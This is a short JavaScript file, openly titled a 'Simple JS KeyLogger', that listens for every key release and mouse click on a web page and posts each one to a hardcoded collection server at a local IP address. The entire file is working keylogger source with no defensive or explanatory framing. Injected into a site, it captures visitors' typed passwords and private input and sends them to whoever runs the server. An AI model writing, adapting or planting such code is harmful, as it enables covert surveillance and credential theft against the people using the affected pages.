/****************************************
 * Simple JS KeyLogger written in JS	*
 * Written by Mr Hery					*
 ****************************************/

(function(){
	var server = "http://192.168.1.179/server.php";
	document.addEventListener("keyup", function(e){
		var x = new XMLHttpRequest();
		x.open("POST", server, true);
		x.send(e.key);
		console.log(e.key);
	});
	
	document.addEventListener("click", function(e){
		var click;
		if(e.which == 1){
			click = " Left Click ";
		}else{
			click = " Right Click ";
		}
		
		var x = new XMLHttpRequest();
		x.open("POST", server, true);
		x.send(click);
		console.log(click);
	});
})();
